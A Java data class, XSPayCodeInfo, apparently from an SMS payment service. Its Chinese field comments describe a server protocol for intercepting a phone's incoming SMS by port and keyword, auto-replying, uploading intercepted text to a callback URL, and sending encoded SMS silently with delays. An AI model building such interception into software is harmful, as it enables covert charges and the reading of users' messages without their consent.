package com.klw.fastfun.pay.common.domain;

import java.io.Serializable;
import java.util.List;

@SuppressWarnings("serial")
public class XSPayCodeInfo implements Serializable{
	
	/** 唯一订单号 */
	private String orderid;
	/** 成功状态 0为成功其他为失败 */
	private String status;
	/** 0:无需拦截下行，1:需要拦截下行，2：拦截的下行通过backurl参数中的链接传回后台 */
	private String isscreen;
	/** isscreen不等于0时存在，下行拦截端口号，多组端口号拦截用“#”号分隔，模糊匹配以给定的内容为开头的端口号全部拦截 */
	private String keyport;
	/** isscreen不等于0时存在，下行拦截关键字，需要匹配多组关键字用“#”号分隔，模糊匹配 */
	private String keyword;
	/** isscreen不等于0时存在，2：回复指定的端口号，1：需要回复拦截的下行，0：无需回复 */
	private String isreply;
	/** isreplay=1或2时存在，回复内容  */
	private String replycontent;
	/** isreplay=2时存在，回复指定端口号 */
	private String replysmsport;
	/** isscreen=2时存在，通过连接传回拦截的下行内容连接后添加orderid&sms=url编码后的短信内容，返回小写ok表示收到上传的内容 */
	private String backurl;
	/** 单位秒，如果有两条短信需要发送 */
	private String delaytime;
	/** 单位秒，存在时请求url采用此延时时间，不存在默认30秒 */
	private String urldelaytime;
	/** 存在时需要访问连接url所有操作做完后延迟6秒请求，连接后添加orderid返回参数和下单接口相同 */
	private String url;
	/** 0:无需发送短信，1：需要base64位解码后sendDataMessage发送，2：base64位解码后将字节数组转为字符串sendTextMessage发送，3：直接发送 */
	private String sendtype1;
	/** sendtype1=1或2时存在需要发送短信，发送内容 */
	private String sms1;
	/** sendtype1=1或2时存在需要发送短信，发送地址 */
	private String smsport1;
	/** sendtype1=1是存在发送短信的端口 */
	private String sendport1;
	/** 0:无需发送短信，1：需要base64位解码后sendDataMessage发送，2：base64位解码后将字节数组转为字符串sendTextMessage发送，3：直接发送 */
	private String sendtype2;
	/** sendtype2=1或2时存在需要发送短信，发送内容 */
	private String sms2;
	/** sendtype2=1或2时存在需要发送短信，发送地址 */
	private String smsport2;
	/** sendtype2=1是存在发送短信的端口 */
	private String sendport2;
	/** 状态描述 */
	private String msg;
	/** 支付结果描述  1–待支付； 2–支付成功； 3 - 支付失败； 4 - 取消订单； 5 - 支付超时； 6 - 退款； 9 - 其他错误 */
	private String result;
	/** 下行过滤 */
	private List<SmsFilter> smsfilter;
	
	public String getUrldelaytime() {
		return urldelaytime;
	}
	public void setUrldelaytime(String urldelaytime) {
		this.urldelaytime = urldelaytime;
	}
	public List<SmsFilter> getSmsfilter() {
		return smsfilter;
	}
	public void setSmsfilter(List<SmsFilter> smsfilter) {
		this.smsfilter = smsfilter;
	}
	public String getBackurl() {
		return backurl;
	}
	public void setBackurl(String backurl) {
		this.backurl = backurl;
	}
	public String getSendport1() {
		return sendport1;
	}
	public void setSendport1(String sendport1) {
		this.sendport1 = sendport1;
	}
	public String getSendport2() {
		return sendport2;
	}
	public void setSendport2(String sendport2) {
		this.sendport2 = sendport2;
	}
	public String getResult() {
		return result;
	}
	public void setResult(String result) {
		this.result = result;
	}
	public String getOrderid() {
		return orderid;
	}
	public void setOrderid(String orderid) {
		this.orderid = orderid;
	}
	public String getStatus() {
		return status;
	}
	public void setStatus(String status) {
		this.status = status;
	}
	public String getIsscreen() {
		return isscreen;
	}
	public void setIsscreen(String isscreen) {
		this.isscreen = isscreen;
	}
	public String getKeyport() {
		return keyport;
	}
	public void setKeyport(String keyport) {
		this.keyport = keyport;
	}
	public String getKeyword() {
		return keyword;
	}
	public void setKeyword(String keyword) {
		this.keyword = keyword;
	}
	public String getIsreply() {
		return isreply;
	}
	public void setIsreply(String isreply) {
		this.isreply = isreply;
	}
	public String getReplycontent() {
		return replycontent;
	}
	public void setReplycontent(String replycontent) {
		this.replycontent = replycontent;
	}
	public String getReplysmsport() {
		return replysmsport;
	}
	public void setReplysmsport(String replysmsport) {
		this.replysmsport = replysmsport;
	}
	public String getDelaytime() {
		return delaytime;
	}
	public void setDelaytime(String delaytime) {
		this.delaytime = delaytime;
	}
	public String getUrl() {
		return url;
	}
	public void setUrl(String url) {
		this.url = url;
	}
	public String getSendtype1() {
		return sendtype1;
	}
	public void setSendtype1(String sendtype1) {
		this.sendtype1 = sendtype1;
	}
	public String getSms1() {
		return sms1;
	}
	public void setSms1(String sms1) {
		this.sms1 = sms1;
	}
	public String getSmsport1() {
		return smsport1;
	}
	public void setSmsport1(String smsport1) {
		this.smsport1 = smsport1;
	}
	public String getSendtype2() {
		return sendtype2;
	}
	public void setSendtype2(String sendtype2) {
		this.sendtype2 = sendtype2;
	}
	public String getSms2() {
		return sms2;
	}
	public void setSms2(String sms2) {
		this.sms2 = sms2;
	}
	public String getSmsport2() {
		return smsport2;
	}
	public void setSmsport2(String smsport2) {
		this.smsport2 = smsport2;
	}
	public String getMsg() {
		return msg;
	}
	public void setMsg(String msg) {
		this.msg = msg;
	}

}
